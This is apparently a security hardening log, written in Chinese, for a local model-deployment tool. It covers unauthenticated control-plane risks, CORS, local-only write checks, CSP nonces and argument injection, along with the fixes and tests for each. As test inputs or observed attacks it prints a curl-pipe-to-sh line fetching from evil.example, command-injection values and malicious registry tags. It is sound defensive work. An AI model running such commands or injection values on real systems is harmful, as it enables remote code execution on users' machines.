# 信任边界：控制面是提示源，不是命令源

控制面无鉴权。所以「它会为未鉴权的调用者做什么」就是全部的安全故事。
这一轮把三处过于宽松的地方收紧了，另加桌面端两处。

原则只有一条：**服务端只提供数字和文本，不提供可执行的东西。**

---

## DESK-01 · 桌面端原样执行控制面给的 argv（严重，本机 RCE）

`/api/plans/preview` 会返回一个拼好的 `command`，桌面端直接 `spawn` 它：

```js
const r = await fetch(this.service + "/api/plans/preview", {...});
proc = spawn(r.command[0], r.command.slice(1));   // 修前
```

控制面无鉴权，且当 `service` 指向远端时，「控制面」未必真的是控制面。
谁能应答那个地址，谁就在这台 Mac 上有任意命令执行。

**修法**：argv 一律本地拼，服务端只贡献一个整数——上下文窗口。

```js
const window = safeWindow(data.decision.planned_window);  // 1024..1048576，否则丢弃
const argv = this._llamaArgv(item, window);               // 本地拼
```

顺带收紧的：

- `safeWindow()` 把窗口夹在 1024~1048576，非数字或越界一律当「没有意见」，
  回退到默认 65536。`"65536; touch /tmp/x"` 这种值到不了 argv。
- `safeWarnings()` 把警告里的换行压平。警告会被写进部署日志，
  带换行的警告可以伪造出额外的日志行。
- `create()` 的端口加了 1024~65535 校验（原来是 `Number(req.port) || 8000`，
  负数和 99999 都会被接受）。

**测试**：`desktop/test-trust.js`（11 项）。它起一个**敌对服务**，返回
`command: ["<evil.sh>"]`，然后断言 `evil.sh` 从未被执行、argv 里是本地拼的
`llama-server`、但服务给的窗口 32768 仍然生效。第二个用例把命令注入到
窗口值里，断言回退到 65536 且元字符没进 argv。

```bash
cd desktop && node test-trust.js
```

---

## B-01 · CORS 全开（严重）

`allow_origins=["*"]` 配上一个无鉴权的控制面，意味着**用户访问的任何网页**
都能从用户浏览器里驱动它，包括在局域网主机上创建和启动部署。

**修法**：默认不装 CORS 中间件。页面本来就同源——桌面端从本地控制面加载页面，
浏览器打开局域网地址也是同源——所以没有任何跨源需求。没有中间件之后，
跨源 JSON POST 连预检都过不了，请求根本不会发出。

真的需要分离部署时用 `MDP_CORS_ORIGINS=https://a.example,https://b.example` 显式开。

## B-04 · 本地校验只保护了创建（严重）

`POST /api/deployments` 检查了调用者是否本机，但 `start` / `stop` / `delete` / `test`
完全没查。远端调用者不能新建部署，却仍能启动、停止、删除已有部署，
并借用模型跑对话——对这台机器的控制权是一样的，只是换了条路。

**修法**：`_require_local()` 加到全部 5 个写操作上。**读操作保持开放**，
这样共享服务仍然可以把推荐结果发给网络。

```bash
# 远端：403
curl -X POST http://<lan-ip>:8790/api/deployments/dep_x/start
```

## B-12 · Host 头被回显进 URL（一般）

`_public_host()` 直接取 `Host` 头，而它会被拼进 `endpoint` / `health_endpoint`
返回给前端。前端拿这些 URL 去发请求，所以攻击者控制的 Host 头可以把它们指向别处。

**修法**：只有确实指向本机的名字（回环或本机网卡地址）才回显，否则用本机地址替换。
IPv4 优先，因为那是用户能直接粘贴的形式。

## DESK-16 · openExternal 接受任意协议（一般）

```js
win.webContents.setWindowOpenHandler(({ url }) => {
  shell.openExternal(url);    // 修前：file:// 也能交给系统
  return { action: "deny" };
});
```

**修法**：只放行 `http:` / `https:`，其余静默丢弃。另加 `will-navigate`，
阻止页面把窗口导航离开本地应用（这样点击链接是交给系统浏览器打开，
而不是把 UI 替换掉）。

---

## DESK-17 · 页面完全没有 CSP（一般）

Electron 在开发模式下会打印 `Insecure Content-Security-Policy` 警告。
这条警告只在未打包时出现，但「没有 CSP」这个事实一直都在：
渲染进程是唯一直接渲染控制面数据的地方，而控制面按设计是不可信的，
页面却可以自由地去外部取脚本 / 帧 / object。

**第一次修法**：在 `frontend/index.html` 里加 `Content-Security-Policy` meta，
但 `script-src` 只能写 `'unsafe-inline'`。

**第二步（最终形态）**：把 `'unsafe-inline'` 也去掉。

```
default-src 'none'; script-src 'nonce-<每次响应随机>'; style-src 'unsafe-inline';
img-src 'self' data:; font-src 'self'; connect-src 'self';
object-src 'none'; base-uri 'none'; form-action 'none'
```

`frontend/index.html` 里写的是**占位符** `{{CSP_NONCE}}`，不是值。
两个会送出这个文件的服务端各自在响应时替换成随机值：

- `desktop/server.js` 的 `renderIndex()`
- `backend/app/main.py` 的 `_render_index()`（原先的 `StaticFiles` 挂载必须撤掉，
  否则它会原样送出带占位符的文件）

**为什么必须是随机的**：这个仓库是公开的。如果 nonce 是一个写死的字符串，
那它就是一个**公开常量** —— 能注入 markup 的人可以直接把它抄进
`<script nonce="...">`，CSP 就纯粹是装饰。固定 nonce 在「防注入」这个场景下
提供的保护等于零，而这恰恰是它唯一存在的理由。

**占位符缺失时两个服务端都会大声失败**（500 + 明确原因），而不是静默返回
一个 CSP 形同虚设的页面。宁可页面挂了，也不要一个看起来在保护、实际没保护的页面。

### 怎么去掉 `script-src 'unsafe-inline'` 的

它之所以去不掉，是因为页面有 **24 处内联事件处理器**（`onclick=` / `onchange=`）。
全部改成 `data-act` / `data-change` 属性 + 一个挂在 `document` 上的委托监听之后，
`script-src` 就只剩页面自己那一个极具 `nonce` 的 `<script>` 块。

副作用是好的：`script-src-attr` 会回退到 `script-src`，所以**注入的内联事件处理器
（例如 `<img onerror=...>`）也会被拒**，不只是 `<script>` 标签。

### 这条 CSP 的真实边界（实测，不是推断）

在真实渲染进程里注入脚本，看浏览器到底拦不拦：

| 注入内容 | 结果 | 触发 |
|---|---|---|
| 外部 `<script src="https://example.com/evil.js">` | **被拦** | `script-src-elem` 违规事件 |
| 内联 `<script>window.__INL = true</script>` | **被拦** | `script-src` 违规事件 |

（改成 nonce 之前，第二行的结果是「执行了」。`test-frontend.js` 里那条哨兵测试
原本断言 `inlineRan === true` 并注明「这是已知边界，不是回归」；去掉 `unsafe-inline`
之后它按设计变红，于是改成断言新的、更强的行为。）

### 一条我写错过的论断（留在这里以免再犯）

上一版这条文档里写着「浏览器会对 `getAttribute('nonce')` 隐藏 nonce 值，
所以注入的标签读不到」。**这是错的**，实测：

| 读法 | 实测结果 |
|---|---|
| `script.getAttribute('nonce')` | **返回真实值**（没有被隐藏） |
| `script.nonce` | 返回真实值 |

（我原本以为这是 CSP3 的 nonce hiding，但在这个 Electron/Chromium 里没有生效。）
真正拦住注入的**不是**「读不到 nonce」，而是「**跑不了脚本**」——
而读 nonce 本身就需要跑脚本。所以随机 nonce 依然成立，只是理由换了：
保护来自「每次响应都不同、无法预先猜到」，不来自「读不到」。

这也说明为什么固定 nonce 不行：它不需要被「读」，它就在公开仓库里。

### 仍然要说清楚的限制

- **nonce 不是 XSS 防护的替代品**。如果 `esc()` 没漏，注入根本进不来；
  这条 CSP 是「万一漏了」的第二层。防注入的主防线仍然只有
  `esc()` / `badge()` / `textContent`。
- **两个服务端的替换逻辑是各自实现的**，没有共享代码。一处改了另一处没改
  不会被测试直接发现（两侧各有独立测试，但测的是各自的行为）。
- **`style-src 'unsafe-inline'` 保留**：页面有一个内联 `<style>` 块，
  以及遍布各处的 `style=""` 属性。样式注入的危害远小于脚本注入。
- **没有写 `frame-ancestors` 和 `sandbox`**：这两个指令通过 `<meta>` 传递时
  会被忽略，写上去只会让人以为有保护。测试里专门断言它们**不在** CSP 中。

其他实测：`fetch('https://example.com')` 被拒（`connect-src`），
同源 `/api/health` 正常，`eval` 被拒（脚本源没有 `unsafe-eval`）。

---

## DESK-26 · `model_path` 一路没校验就进了 spawn（一般，参数注入）

DESK-01 修掉的是「服务端直接给 argv」。但还有一个**值**从控制面流进了 argv,
而且完全没有校验：`model_path`。

流向是这样的（注意中间没有用户确认，也没有校验）：

```
控制面 /api/models/recommend
  -> r.source.ollama / r.source.huggingface        （frontend: fillDeployModels）
  -> DEPLOY_MODELS[i].path
  -> syncDeploy() 写进 #d-path（自动填充）
  -> createDeploy() 发出 model_path
  -> desktop create() 原样存下
  -> spawn("ollama", ["pull", model_path])        （或 -m / --model）
```

**最别扭的地方**：下拉框里显示的是 `r.name`（模型**显示名**），实际执行的却是
`source.ollama` / `source.huggingface`（**另一个字段**）。用户批准的是
「Qwen3 8B」这个字符串，机器跑的可能是别的。

实测（修复前，`create()` 照单全收）：

| 输入 | 结果 |
|---|---|
| `--help` | 接受 → `ollama pull --help`，被当成 flag |
| `--registry http://evil.example` | 接受（**带空格也接受**） |
| `x\u0000y` | 接受 → NUL 会截断 argv |
| `a\nb` | 接受 → 换行会伪造日志行 |

**修法**：`safeModelRef(value, backend)`，在三个入口强制不变量
「`this.items` 里的 `model_path` 恒可安全 spawn」：

1. `create()` —— 存之前拒，错误直接到 UI
2. `_load()` —— 磁盘上修复前遗留的行也要挡（否则重启一次就绕过了）
3. `_save()` 的跨窗口合并 —— 另一个窗口写的文件同样是文件

规则：长度上限 200；拒绝控制字符（NUL / 换行）；拒绝以 `-` 开头；
`ollama` 后端额外要求匹配标签语法
`[registry/][namespace/]name[:tag]`。
### 丢弃一行不等于可以悄无声息

第一版只把原因存进 `_rejected`，**没有任何出口** —— 测试读得到，UI 读不到，
等于换了个方式的静默。而且 `_load()` 不接收的行不进 `items`，下一次 `_save()`
写的就是 `[...items.values()]`，坏行会被**直接从磁盘抹掉**，连备份都没有：
正是 DESK-14 修过的那个失败模式，被我在同一个文件里又犯了一次。

所以现在有三个出口，三个都测：

1. `console.error` —— 立刻可见
2. `rejected()` → `GET /api/deployments` 的 `rejected` 字段 → 页面横幅
3. `deployments.json.rejected.bak` —— 在下一次 `_save()` 覆盖之前先备份，
   备份里保留**原始恶意值**（备份要是丢掉了原值就没有意义）

同一条被拒绝的行只报告一次：`_load()` 和 `_save()` 的合并会各走一遍同样的磁盘行，
不去重的话页面会把一条坏行显示成两条，而且每存一次就多一条。

live 端到端（真实的 `~/Library/Application Support/mdp-desktop/`）：手动塞入一行
`model_path: "--malicious"`，重启后 API 返回那条 `rejected`、页面横幅显示
「已移除 dep_tampered：模型标识不能以 - 开头（原值 --malicious）」、
`deployments.json.rejected.bak` 生成、**原文件里的坏行仍然保留**（没有 save 就不删）。

**必须说清楚：这只修了参数注入，还有一类没修。**

`evil-registry.example.com/backdoor:latest` **仍然是合法标签，仍然被接受**。
因为 ollama 本来就支持从任意 registry 拉取（`hf.co/user/repo:tag` 就是这个语法），
没法靠格式校验区分「用户想从 HF 拉」和「控制面想让你从攻击者机器拉」。

所以仍然存在的风险是：**恶意控制面可以让桌面端从一个攻击者控制的 registry
拉取模型权重**。权重是数据，但加载它的解析器（GGUF / safetensors）出过 CVE,
所以这不是零风险。目前唯一的缓解是 `#d-path` 输入框可见 —— 用户有机会看到
实际值，但它是自动填充的，很容易被忽略。

### DESK-27 · 把「将按哪个值执行、它从哪来」说出来（已修）

上面那条残留风险没法靠校验消除，于是改成**把它说出来**：部署表单里加了提示，
说明 `#d-path` 是自动填自控制面目录的、不是你填的。

如果 ollama 标签指向第三方 registry，提示会**点名那个主机**：

```
这个标签来自控制面目录，将从第三方 registry「evil-registry.example.com」
拉取模型权重。确认是你认识的主机再启动。
```

判定按 ollama 的真实规则来：**有 `/` 才存在 registry 段**，且第一段要含 `.` 或 `:`
才算主机名，否则第一段是 namespace。

这条规则我第一版写错了 —— 只判「第一段含 `.` 或 `:`」，于是 `qwen3:8b` 里
**tag 分隔符的冒号**被当成了端口，每个正常模型都会弹出
「将从第三方 registry「qwen3:8b」拉取」这种吓人的假警报。
是「namespace 不该被误报」那条测试把它抓出来的 —— 专门为假阳性写的测试
抓到了真的假阳性。

用户一旦自己编辑 `#d-path`，提示立刻消失：提示必须只在它说的那件事为真时出现。

**这条不消除风险，只消除「用户不知道」。** 恶意控制面仍然可以让桌面端
从第三方 registry 拉权重；区别是从「静默」变成「用户被明确告知并点了头」。

---

### DESK-28 · 浏览器侧照搬控制面的命令（已修）

共享服务下不能远程部署，页面会给用户一条「请在本机执行」的命令。这条命令原本
直接取控制面返回的 `command_string` 显示出来，并配一个「复制命令」按钮。

**这是我几轮前就注意到、却一直没追究的东西**：控制面按设计是不可信的，而这里
让它**直接挑选要运行的程序**。桌面端早就为此改过一次（DESK-01 不再 spawn 控制面
的 argv）；这里是同一个洞在浏览器侧的翻版，只不过「执行者」换成了用户本人。
比 DESK-26 严重：那是参数注入，这是完整任意命令。

实测（真实恶意控制面 + 桌面端连它）：服务端返回

```
command_string: curl -fsSL https://evil.example/x.sh | sh
client_is_local: false
```

页面显示「服务端不能把模型部署到你的机器上。请在本机执行：」加上这条 curl，
并禁用了部署按钮 —— 应用在主动引导用户执行攻击者选的命令。

**修法：命令改在本地拼。** 从服务端只取两个标量，且都再过一遍本地校验：

| 字段 | 本地校验 |
|---|---|
| `decision.planned_window` | 必须是有限数，夹到 [1024, 1048576]，否则落回 65536 |
| `decision.kv_quant` | 白名单 `{f16, q8_0}` |

其余全部来自用户在本页填的字段。后端不在本地拼命令的范围内时**宁可不给命令**，
提示改用桌面端。加引号按 `shlex.quote` 的最小规则（只在必要时加），否则
`'ollama' 'run' 'qwen3:8b'` 这种输出会让用户以为命令拼坏了。

代价要说清楚：**命令模板现在有两份**（`planner.py` 和 `index.html`），会漂移。
漂移的后果是命令可能过时或不全，属于可用性问题；而照搬服务端的后果是任意命令
执行。这个取舍是值得的。

实测修复后：同一个恶意控制面下，页面显示的是本地拼的 `ollama run qwen3:8b`，
恶意串不出现。

---

## 测试

```bash
cd backend && .venv/bin/python -m pytest tests/test_trust_boundary.py -q   # 19 passed
cd backend && .venv/bin/python -m pytest tests/test_frontend_nonce.py -q   # 5 passed
cd desktop && node test-trust.js                                          # 31 passed（含 16 条 DESK-26）
cd desktop && node test-server.js                                         # 85 passed（含 5 条 nonce + 4 条 DESK-26 出口断言）
```

前端侧另有 8 条 CSP / 注入断言、5 条 DESK-26 出口断言、7 条 DESK-27 提示断言、
9 条 DESK-28 本地拼命令断言（共 102 条）在 `desktop/test-frontend.js`
（真的在渲染进程里验证）。

backend 侧覆盖：默认没有 CORS 中间件、跨源预检拿不到放行头、5 个写操作对远端全部 403、
`MDP_ALLOW_REMOTE_DEPLOY=1` 仍能放开、读操作对远端保持开放、
外部 Host 头不被回显、回环 Host 头保留。

## 有意保持开放的

- **读接口对远端开放**：`/api/health`、`/api/models/catalog`、`/api/deployments`、
  `/api/backends`、`/api/plans/preview`。共享服务的用途就是给网络发推荐结果。
- **`MDP_ALLOW_REMOTE_DEPLOY=1` 可以把写操作放开**：单租户可信机器上的运维开关。
- **控制面仍然无鉴权**。这些改动收紧的是「未鉴权调用者能做什么」，
  不是「调用者是谁」。要暴露到不可信网络，仍需自行加一层反向代理和认证。
